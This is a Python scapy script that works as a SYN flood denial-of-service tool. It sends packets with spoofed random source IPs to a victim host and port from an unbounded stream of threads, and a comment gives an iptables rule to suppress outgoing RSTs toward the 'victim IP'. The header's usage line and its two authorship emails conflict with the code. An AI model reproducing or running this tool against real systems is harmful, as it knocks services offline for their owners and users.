"""
========================================
Name:Yunyou Author: Lalevin Martin
 Mailbox: zzlyxht@outlook.com                                                
 Github: http://github.com/nacglalevin
Written in 2024-5-25
How to use:netstat -n | awk '/^tcp/ {++S[$NF]} END{for(a in S) print a,S[a]}
==================NACG==================
"""
#coding=utf-8
# iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 被害IP -j DROP
import argparse
import socket,sys,random,threading
from scapy.all import *

scapy.config.conf.iface = 'ens32'

# 攻击目标主机TCP/IP半开放连接数,windows系统半开连接数是10个
def synflood(target,dstport):
    semaphore.acquire()       # 加锁
    issrc = '%i.%i.%i.%i' % (random.randint(1,254),random.randint(1,254),random.randint(1,254), random.randint(1,254))
    isport = random.randint(1,65535)
    ip = IP(src = issrc,dst = target)
    syn = TCP(sport = isport, dport = dstport, flags = 'S')
    send(ip / syn, verbose = 0)
    print("[+] sendp --> {} {}".format(target,isport))
    semaphore.release()       # 释放锁

def Banner():
    print("  _          ____  _                _    ")
    print(" | |   _   _/ ___|| |__   __ _ _ __| | __")
    print(" | |  | | | \___ \| '_ \ / _` | '__| |/ /")
    print(" | |__| |_| |___) | | | | (_| | |  |   < ")
    print(" |_____\__, |____/|_| |_|\__,_|_|  |_|\_\\")
    print("       |___/                             \n")
    print("E-Mail: me@lyshark.com\n")

if __name__ == "__main__":
    Banner()
    parser = argparse.ArgumentParser()
    parser.add_argument("-H","--host",dest="host",type=str,help="输入被攻击主机IP地址")
    parser.add_argument("-p","--port",dest="port",type=int,help="输入被攻击主机端口")
    parser.add_argument("--type",dest="types",type=str,help="指定攻击的载荷 (synflood/sockstress)")
    parser.add_argument("-t","--thread",dest="thread",type=int,help="指定攻击并发线程数")
    args = parser.parse_args()
    if args.types == "synflood" and args.host and args.port and args.thread:
        semaphore = threading.Semaphore(args.thread)
        while True:
            t = threading.Thread(target=synflood,args=(args.host,args.port))
            t.start()
    else:
        parser.print_help()